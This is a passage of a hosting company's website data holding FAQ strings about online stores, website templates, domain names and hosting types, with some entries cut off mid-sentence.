It is different from traditional stores, which sell products in a physical location or brick-and-mortar store.</p> <p>An eCommerce website can be anything from a small business selling its own products on a basic storefront to a huge online marketplace selling thousands of products. Generally, customers pay via a digital payment gateway, and products are delivered, but cash payments and in-store pickup are also possible.</p>","online-store-neediness":'<p>Even if you’re already selling on online marketplaces like Etsy and Amazon, there are still many benefits to running your own eCommerce site. Aspects like search engine optimization (appearing at the top of search results on search engines like Google) and seamless integration with social media platforms becomes a lot easier and more impactful when you have your own online store.</p> <p>You’ll also be able to make your product pages stand out from the competition, something that’s a lot harder to do when you’re working within the framework of sites like Amazon and eBay. Having your own store with its own URL also helps you scale your brand and build credibility. Plus, many platforms take up to 15% of your sales in the form of various fees, meaning you end up with smaller profit margins overall.</p> <p>You can use your website not just to sell online but also to offer exclusive information about your products and services through a dedicated blog.

Since your eCommerce store exists online, you won’t have to worry about costly monthly expenses like electricity, water, and rent for your store property.</p> <p>You also won’t be restricted by your geographical location or set opening hours, as an online store is open 24/7 and can be accessed from all corners of the globe. Chances are that you also won’t need as much staff, meaning that general operating costs will be lower.</p>","online-store-duration-to-create":"<p>That depends on what you’re selling, and how you want to set up your store.

You can add social widgets to your store to make it easy for your visitors to share their favorite products with their followers.

In short, a well-designed one-page website template should be easy to transform into an online store by simply adding eCommerce functionality and extra pages to the template.</p>","website-templates-how-to-use":"<p>Start by choosing the best website template for your site. You can preview the different website designs to see the template in action. Once you find one that’s the perfect fit for your site, pay for a web hosting plan and start customizing. Add other page functions, like extra pages, new page sections, social media feeds, and contact forms in the drag-and-drop editor. When you’re happy with the result, connect the template to a custom domain and launch your creation for the whole world to see.</p>","website-templates-more-pages":'<p>Absolutely – think of website themes as creative examples of how a website could look. Since you can customize everything, adding more pages is one mouse click away when editing your theme in the <a href="{link}">site builder</a>.</p>',"website-templates-html-knowledge":"<p>No, the drag-and-drop website builder is, first and foremost, a visual builder, meaning that you don’t need to know any HTML to manage your website. Simply select an element on the page and drag it to its new position. The in-built grid makes sure that all page elements are properly aligned.</p>","website-templates-choose":"<p>Start by thinking about the kind of site you want to have. Are you looking for a minimal portfolio template or something for a professional website? Maybe you only need a landing page for your company.

You can also customize the mobile version of your website separately to ensure each element looks as it should, no matter the screen size.</p>","website-templates-unique":"<p>That depends on how much you customize your template. If you need a basic website and don’t have the time to change the color scheme or add custom pages, chances are that your site will look similar to other websites. But this isn’t necessarily a bad thing if other sites using the same template don’t operate in your field.</p> <p>Thankfully, editing the different pages and page sections on-site is fast and easy with the visual drag-and-drop editor. And if you want to be truly unique, get creative with the blank templates instead.</p>","website-templates-changes":"<p>Of course. Even the best website out there is a living, breathing thing. From time to time, you need to consider creating new pages, updating old ones, or adding new functionality to your site. Your online business might evolve into a fully-fledged eCommerce company, or your contact details may change. When this happens, simply head back to the website editor, make the necessary changes to your pages, and update your website.</p>","website-templates-choose-from":"<p>Some of the most popular template categories include eCommerce, portfolio, business, resume, blog, marketing, and fashion templates. There is also a selection of blank themes if you already have a vision you want to bring to life yourself.</p>","website-templates-html-code":"<p>While you can’t directly edit the code of your website, you can add custom code to your pages. This way, you can add interactive features to your pages, like various widgets, infographics, interactive maps, quizzes, forms, animations, and more, without needing to have access to the backend of your website.</p>"},"ssl-certificates-a1":"<p>SSL (Secure Sockets Layer) or TLS (Transport Layer Security) is a security protocol that enables encrypted communication between a website and a web browser.

The Internet Corporation for Assigned Names and Numbers (ICANN), an organization maintaining TLDs, divides all domain extensions into five categories: generic domain extensions (gTLD), sponsored (sTLD), country-code (ccTLD), Infrastructure, and test (tTLD).</p><p>Combining the right website name with the perfect domain extension will provide credibility to your business, help your SEO efforts, attract more visitors, and establish your brand online.</p>","tld-a2":"<p>You can buy domain names in two steps:</p><p>1. Enter a website name into the <a href='{link}'>search box above</a> and select the TLD you like by clicking Add to Cart.</p><p>2. Go to the Checkout page, select the length of registration, and complete the purchase.</p><p>Congratulations! You now own the web address for the entire registration period.</p>","tld-a3":"<p>Yes. A new domain extension has a specific meaning that can help potential customers identify the purpose of your website at a glance.</p><p>For example, local businesses that use country-code extensions will make it clear where their target market is. They can build credibility and improve your branding, making the new domain extension acquisition worthwhile.</p><p>You can also <a href='{link}'>get a free domain name</a> by purchasing our Premium, Business or any Cloud Hosting plan. These plans come with free domain registration for one year, domain-based email addresses, and all features necessary for a high-performing website.</p>","tld-a4":"<p>When starting a business or building a brand, choosing a recognizable domain extension is a very good practice. It makes remembering your website easier, potentially improving its traffic and attracting new customers.</p><p>Other aspects that make a great domain name are:</p><li>Length – your domain should have up to 2-3 words.</li><li>Simplicity – avoid numbers, dashes, and abbreviations.</li><li>Relevant keywords – can help you rank better on search engines.</li>","tld-a5":"<p>If your preferred domain name has already been registered by someone else, try using a <a href='{link}'>WHOIS search tool</a> to find the current owner’s contact information, and make an offer to buy it. Or wait for the domain ownership to expire and purchase it.</p><p>However, the best course of action is to choose a different website name or explore newer domain extensions that are available for registration. You can even find out a better option.</p>","tld-a6":"<p>While many of us would like to purchase our website address permanently, unfortunately, that is not possible. The standard domain registration period is one year, but you’ll have the option to renew it.</p><p>You can also register your domain name for a longer period. Depending on the TLD, you can register your web address for up to three years, saving you the hassle of repeating the payment process every year.</p><p>Also, it reduces the risk of forgetting to renew it in time and losing your domain name to someone else.</p>","tld-a7":"<p>You can transfer your website name to Hostinger in a few steps:</p><p>1. Go to our <a href='{link}'>domain transfer tool</a> and enter the domain name you’d like to transfer.</p><p>2. Complete the purchase and enter the <a href='{link2}' target='_blank'>EPP code</a>, which you get from your current domain registrar.</p><p>3. You’ll receive an email confirming the transfer is complete.</p><p>That’s it – the process is really that simple.</p>","tld-a8":"<p>You don’t necessarily need to buy a domain name to build an online presence. You can publish your content on third-party websites, but keep in mind that they will likely keep ownership of your work, sometimes preventing you from moving it or using it on other websites.</p><p>Buying a new domain name gives you full ownership of your website, content, and, most importantly, brand. No one else will be able to use the same name – it is reserved for your use only for the entire registration period.</p><p>Not to mention that owning a top-level domain will make you seem a lot more professional. So, search for your ideal TLD today.</p>"},question:{"drupal-hosting-q1":"What Is Drupal?","drupal-hosting-q2":"What Is Drupal Hosting and How Is It Different?","drupal-hosting-q3":"Can I Turn My

There are numerous types of hosting that use shared servers, meaning they share the available server resources. To grow your site or host web applications, you will need higher-tier or cloud plans.</p> <p>Hostinger allows users to upgrade their hosting service as needed. Start with a basic shared web hosting plan and switch to a cloud or VPS hosting later.</p> <p>The most common types of hosting include:</p> <p><b>Shared hosting:</b> with shared hosting plans, a number of websites are hosted on a single web server. Each user receives a certain amount of storage and resources for their site. Shared solutions are frequently the best option for simple websites and blogs because of their affordable price.</p> <p><b>VPS hosting:</b> a virtual private server (VPS) is the next level of hosting. While you still share the same server with other users and their websites, with VPS hosting, each user gets a dedicated virtual machine and full root access to the web server.</p> <p><b>Cloud hosting:</b> this type of hosting is ideal for websites that require additional server processing power. As cloud hosting employs interconnected servers that take over from one another if necessary, you can be sure your websites remain up and running at all times.</p> <p><b>Dedicated hosting:</b> a dedicated host service provides your website with a full server, meaning you won’t share storage or other resources with anybody else. Dedicated hosting services are often the best option for professional web administrators and developers managing resource-intense websites.</p> <p>Our primary goal at Hostinger is to provide fast hosting with premium features and 99.9% uptime at an unbeatable price.</p>","faq.question.shared-hosting-q2":"How Does a Web Hosting Service Work?","faq.answer.shared-hosting-a2":"<p>Websites are a collection of files and databases. Hostinger, as a web host, provides the servers and infrastructure for you to store this information and make it accessible to internet users.</p> <p>When you sign up for one of our hosting options, you’ll receive login information for the admin panel of your account. From there, you can manage your website, hosting plan, domain, databases, files, and more.</p>","faq.question.shared-hosting-q3":"Why Do I Need Website Hosting?","faq.answer.shared-hosting-a3":"<p>You need a hosting package to get your website online and visible to potential customers.</p> <p>While it is possible to create a website without third-party hosting, this is not advised for beginners. If you don't know how to set up a hosting server properly, using a platform like Hostinger helps you save time and money.</p>","faq.question.shared-hosting-q4":"What Kind of Support Will I Get in India?","faq.answer.shared-hosting-a4":"<p>Our Customer Success team goes above and beyond to guarantee that our clients succeed online. If you have an issue, don’t hesitate to contact us via live chat. We'll do everything we can to help you resolve it.</p> <p>Our team of experts can help regardless of whether you are a pro or it’s your first time setting up a website.</p>","faq.question.shared-hosting-q5":"What Are the Differences Between Domain and Hosting?","faq.answer.shared-hosting-a5":"<p>While web hosting is a service that stores your site’s files, a domain name is the address of your website. A domain name and web hosting are required for all websites so they can be accessed online.</p> <p>Visitors’ web browsers translate your domain (for example, hostinger.com) into an IP address and use it to locate the hosting server that stores all of your site data whenever anyone wants to visit it.</p>","faq.question.shared-hosting-q6":"What Are the Main Differences Between Shared Hosting and VPS?","faq.answer.shared-hosting-a6":"<p>A virtual private server (VPS) is a hybrid web host service that combines shared hosting and dedicated server technology.</p> <p>When you use shared hosting, you share a web server and its resources with a number of other websites. This can often result in less control overall. With a VPS, you’re still sharing a physical server with others, but each website has its own virtual space and dedicated resources.</p> <p>Using a VPS gives site owners and developers the independence of a dedicated hosting arrangement and the freedom to modify their server to their liking.</p>","faq.question.shared-hosting-q7":"I Have a Website. Can I Transfer It to Hostinger?","faq.answer.shared-hosting-a7":"<p>Yes – if you’re using a popular content management system like WordPress or Drupal, we offer solutions that make switching between web hosts simple and quick. Even if your website is not running a traditional CMS, our Customer Success team is here to walk you through the process.</p>","faq.question.shared-hosting-q8":"Can I Buy Hosting Without a Domain Name?","faq.answer.shared-hosting-a8":"<p>While you technically can have hosting without a domain, it will be hard for visitors to find your website without a domain name. Your domain essentially translates your website’s IP address into a word or phrase. Our annual hosting plans come with free domain names, but you can also purchase custom domain names from other registrars and point them to Hostinger if you desire.</p>","faq.question.shared-hosting-q9":"Do the Plans Come With a Control Panel?","faq.answer.shared-hosting-a9":"<p>Yes, you can control each web hosting plan from our in-house developed hPanel.</p> <p>hPanel contains all the tools for basic administration, resource monitoring, email address creation, and installation of content management systems like WordPress. It’s important to note that it is not the admin panel for your website, which is generated when you install a CMS.</p>","faq.question.shared-hosting-q10":"How Can I Upgrade My Account if I Need to?","faq.answer.shared-hosting-a10":"<p>You can easily upgrade your plan via hPanel. Plan upgrades result in zero downtime, meaning your website will remain operational throughout the upgrade process. You won’t have to worry about losing money or providing visitors with an unpleasant browsing experience.</p>","faq.question.shared-hosting-q11":"Do I Need Web Hosting Services With WordPress?","faq.answer.shared-hosting-a11":"<p>Yes, you need web hosting for a website run by WordPress. WordPress is a free content management system (CMS) that helps you create a website and manage its content. Web hosting is needed for storing files and databases so that everyone can see your website.</p> <p>WordPress can be installed on all our hosting options with just one click. All hosting plans also come with speed optimisation features, auto-updates, and support from WordPress experts.</p>","faq.question.shared-hosting-q12":"How to Connect Domain Name With Web Hosting?","faq.question.shared-hosting-q13":"Do You Offer a Script Auto-Installer?","faq.answer.shared-hosting-a13":"<p>Yes, Hostinger provides a custom-built solution that allows you to install over 100 web applications on your website with just a few clicks. Our auto-installer not only saves time but also makes it easier to try out different scripts on your website and choose which web app is best for your needs.</p>","faq.question.shared-hosting-q14":"Do I Need to Have the Technical Knowledge to Use Hostinger as My Web Host?","faq.answer.shared-hosting-a14":"<p>No. As a website host, Hostinger makes it as easy as possible for beginners to create and manage their websites. You can perform many simple tasks without knowing the technical aspects behind website development, like setting up an email address, installing a content management system, and using our website builder platform.</p> <p>Our web hosting services are also suitable for experienced web developers. You can easily manage different projects and multiple customers through our Pro Panel dashboard.</p> <p>If you face any issues, we offer 24/7 support and a variety of online guides to walk you through all sorts of tasks.</p>","faq.question.wordpress-hosting-q1":"What Is WordPress?","faq.answer.wordpress-hosting-a1":"<p>WordPress is a content management system for website development and the most commonly used website-building platform, powering over 40% of all websites.</p><p>WordPress is so popular partly because it’s beginner-friendly – you don’t need coding knowledge to create a functional site.

You can still operate a WordPress website, but you won’t get the specific tools we’ve talked about.</p><p>If you want to build WordPress sites only, opt for WordPress hosting.
